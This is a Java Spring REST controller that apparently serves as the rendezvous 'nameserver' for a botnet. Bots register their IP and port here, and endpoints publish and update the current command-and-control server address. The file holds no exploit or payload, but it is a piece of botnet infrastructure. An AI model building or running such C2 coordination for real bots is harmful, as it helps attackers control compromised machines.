package athena.nameserver.handler.lookup;

import BotHandling.Bot;
import BotHandling.BotHandler;
import C2Handling.C2;
import C2Handling.C2Handler;

import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;
import org.springframework.web.bind.annotation.*;

import java.util.ArrayList;
import java.util.List;
import java.util.logging.Logger;

/**
 * The main lookup endpoint for the webserver.
 */
@RestController
@RequestMapping("")
public class LookupController
{
    Logger logger = Logger.getLogger(String.valueOf(LookupController.class));
    BotHandler botHandler;
    C2Handler c2Handler;
    public LookupController()
    {
        botHandler = new BotHandler();
        c2Handler = new C2Handler();
    }

    @CrossOrigin
    @GetMapping("/")
    public String get() {
        return "athena_nameserver::operational";
    }

    /**
     * Updates the IP address of the webserver.
     * @param c2Details the details with {ip: [ip], port: [port]}
     * @return String stating the ip address and the bot.
     * @throws ParseException in case of a malformed request body.
     */
    @CrossOrigin
    @PostMapping("/api/lookup/c2/update")
    public String updateC2(@RequestBody String c2Details) throws ParseException {
        JSONObject jsonObject = (JSONObject) new JSONParser().parse(c2Details);
        String ip = jsonObject.get("ip").toString();
        String port = jsonObject.get("port").toString();
        c2Handler.updateC2(ip, port);
        return ip + "::updated";
    }

    /**
     * Gets the IP address of the webserver.
     * @return String formatted ip::portNum
     */
    @CrossOrigin
    @GetMapping("/api/lookup/c2")
    public String getC2IpAddress() {
        C2 c2 = c2Handler.getActiveC2();
        if (c2 == null)
            return "not_active::not_active";
        return c2.ip() + "::" + c2.portNum();
    }

    /**
     * Updates the bot with the nameserver.
     * @param botDetails the bot details (id, ip, port)
     * @return String containing botId::updated
     * @throws ParseException in case of a failed Parse
     */
    @CrossOrigin
    @PostMapping("/api/lookup/bot/update")
    public String updateBot(@RequestBody String botDetails) throws ParseException {
        JSONObject jsonObject = (JSONObject) new JSONParser().parse(botDetails);
        String botId = jsonObject.get("id").toString();
        String ip = jsonObject.get("ip").toString();
        String portNum = jsonObject.get("port").toString();
        botHandler.botPing(botId, ip, portNum);
        return botId + "::updated";
    }

    /**
     * Find the IP address of the bot.
     * @param bot_id the id name of the bot
     * @return JSONObject containing the whereabouts of the bot.
     */
    @CrossOrigin
    @GetMapping("/api/lookup/bot/{bot_id}")
    public String getBotIPAddress(@PathVariable String bot_id)
    {
        if (!botHandler.botInSystem(bot_id))
            return "not_found::not_found";
        if (botHandler.getActiveBot(bot_id) != null)
        {
            Bot bot = botHandler.getActiveBot(bot_id);
            return bot.ipAddress() + "::" + bot.portNumber();
        } else
        {
            return "not_active::not_active";
        }
    }

    /**
     * Gets all the bots in the system, with their corresponding status.
     * @return String containing a list of all the bots.
     */
    @CrossOrigin
    @GetMapping("/api/lookup/bot")
    public String getAllBots()
    {
        List<String> botList = new ArrayList<>();
        for (Bot bot: botHandler.getAllActiveBots())
        {
            String output = bot.id() + "::" + bot.ipAddress() + "::" + bot.portNumber();
            botList.add(output);
        }
        return botList.toString();
    }
}
